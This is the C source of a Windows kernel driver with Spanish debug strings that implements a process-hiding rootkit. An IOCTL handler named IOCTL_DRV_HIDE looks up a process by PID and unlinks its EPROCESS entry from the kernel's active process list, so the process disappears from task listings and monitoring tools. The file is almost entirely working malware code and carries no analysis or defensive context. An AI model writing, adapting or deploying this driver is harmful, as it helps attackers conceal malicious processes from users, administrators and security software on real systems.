#include <ntddk.h>
#include "ntifs.h"
#include "interface.h"

NTSTATUS DriverEntry(IN PDRIVER_OBJECT driverObject,IN PUNICODE_STRING registryPath);
NTSTATUS dkomCreate(IN PDEVICE_OBJECT deviceObject,IN PIRP Irp);
NTSTATUS dkomWrite(IN PDEVICE_OBJECT deviceObject,IN PIRP Irp);
NTSTATUS dkomRead(IN PDEVICE_OBJECT deviceObject,IN PIRP Irp);
NTSTATUS dkomClose(IN PDEVICE_OBJECT deviceObject,IN PIRP Irp);
NTSTATUS dkomControl(IN PDEVICE_OBJECT deviceObject,IN PIRP Irp);
NTSTATUS dkomUnload(IN PDRIVER_OBJECT driverObject);

NTSTATUS DriverEntry(IN PDRIVER_OBJECT driverObject, IN PUNICODE_STRING registryPath)
{
   NTSTATUS ntstatus = STATUS_SUCCESS;
   UNICODE_STRING deviceNameUnicode, dosDeviceNameUnicode;
   PDEVICE_OBJECT dkomDevice;
   int i;
   
   DbgPrint("Llamada a driverEntry\n");
   
   RtlInitUnicodeString(&deviceNameUnicode,dkomDeviceName);
   ntstatus = IoCreateDevice(driverObject,
                             0,
                             &deviceNameUnicode,
                             FILE_DEVICE_UNKNOWN,
                             FILE_DEVICE_SECURE_OPEN,
                             FALSE,
                             &dkomDevice);
   if(!NT_SUCCESS(ntstatus)){
      DbgPrint("Fallo al crear el dispositivo\n");
      return ntstatus;
   }
   DbgPrint("Dispositivo creado correctamente\n");
   
   RtlInitUnicodeString(&dosDeviceNameUnicode,dkomDeviceLink);
   ntstatus = IoCreateSymbolicLink(&dosDeviceNameUnicode,
                                   &deviceNameUnicode);   
   if(!NT_SUCCESS(ntstatus))
   {
      IoDeleteDevice(dkomDevice);
      DbgPrint("Fallo al crear el enlace simbolico\n");
      return ntstatus;
   }
   DbgPrint("Enlace simbolico creado correctamente\n");
   
   driverObject->MajorFunction[IRP_MJ_CREATE]         = dkomCreate;
   driverObject->MajorFunction[IRP_MJ_CLOSE]          = dkomClose;
   driverObject->MajorFunction[IRP_MJ_READ]           = dkomRead;
   driverObject->MajorFunction[IRP_MJ_WRITE]          = dkomWrite;      
   driverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = dkomControl;
   driverObject->DriverUnload                         = dkomUnload;
   
   return ntstatus;
}

NTSTATUS dkomCreate(PDEVICE_OBJECT deviceObject, PIRP Irp)
{
   NTSTATUS ntstatus = STATUS_SUCCESS;
   DbgPrint("Llamada a dkomCreate\n");
   return ntstatus;
}

NTSTATUS dkomWrite(PDEVICE_OBJECT deviceObject, PIRP Irp)
{
   NTSTATUS ntstatus = STATUS_SUCCESS;
   DbgPrint("Llamada a dkomWrite\n");
   return ntstatus;
}

NTSTATUS dkomRead(PDEVICE_OBJECT deviceObject, PIRP Irp)
{
   NTSTATUS ntstatus = STATUS_SUCCESS;
   DbgPrint("Llamada a dkomRead\n");
   return ntstatus;
}

NTSTATUS dkomClose(PDEVICE_OBJECT deviceObject, PIRP Irp)
{
   NTSTATUS ntstatus = STATUS_SUCCESS;
   DbgPrint("Llamada a dkomClose\n");
   return ntstatus;
}

NTSTATUS dkomControl(PDEVICE_OBJECT deviceObject, PIRP Irp)
{
   NTSTATUS ntstatus = STATUS_NOT_IMPLEMENTED;
   PIO_STACK_LOCATION pStack;
   PLIST_ENTRY pProcessList;
   PEPROCESS pEProcess;
   proc2Hide *p2h;
   ULONG uEProcessAddr;
     
   DbgPrint("Llamada a dkomControl\n");
   
   pStack = IoGetCurrentIrpStackLocation(Irp);
   Irp->IoStatus.Status      = STATUS_SUCCESS;
   Irp->IoStatus.Information = 0;
   
   switch(pStack->Parameters.DeviceIoControl.IoControlCode)   
   {
      case IOCTL_DRV_HIDE:
           
         DbgPrint("Recibido codigo de control IOCTL_DRV_HIDE\n");
         p2h = (proc2Hide *) Irp->AssociatedIrp.SystemBuffer;
         if(PsLookupProcessByProcessId((PVOID)p2h->iPid,&pEProcess) == STATUS_SUCCESS)
         {
            DbgPrint("Ocultando proceso con PID %d en la direccion %08lX\n",p2h->iPid,pEProcess);
            uEProcessAddr = (ULONG) pEProcess;
            pProcessList = (LIST_ENTRY *)(uEProcessAddr + p2h->iFlinkOffset);
            *((ULONG *) pProcessList->Blink) = (ULONG) pProcessList->Flink;
            *((ULONG *) pProcessList->Flink + 1) = (ULONG) pProcessList->Blink;
            pProcessList->Flink = (LIST_ENTRY *) &(pProcessList->Flink);
            pProcessList->Blink = (LIST_ENTRY *) &(pProcessList->Flink);
         }
         else
            DbgPrint("No se ha obtenido la direccion del EPROCESS para el PID\n",p2h->iPid);
         
         break;
         
      default:
         DbgPrint("Recibido codigo de control no definido\n");     
         break;
   }
   
   ntstatus = Irp->IoStatus.Status;
   IoCompleteRequest(Irp,IO_NO_INCREMENT);
   return ntstatus;
}

NTSTATUS dkomUnload(IN PDRIVER_OBJECT driverObject)
{
   NTSTATUS ntstatus = STATUS_SUCCESS;
   PDEVICE_OBJECT dkomDevice = driverObject->DeviceObject;
   UNICODE_STRING dosDeviceNameUnicode;
   
   DbgPrint("Llamada a dkomUnload\n");
   
   RtlInitUnicodeString(&dosDeviceNameUnicode,dkomDeviceLink);
   IoDeleteSymbolicLink(&dosDeviceNameUnicode);
   DbgPrint("Se ha eliminado el enlace simbolico\n");
   IoDeleteDevice(driverObject->DeviceObject);
   DbgPrint("Se ha eliminado el device\n");
   
   return ntstatus;
}


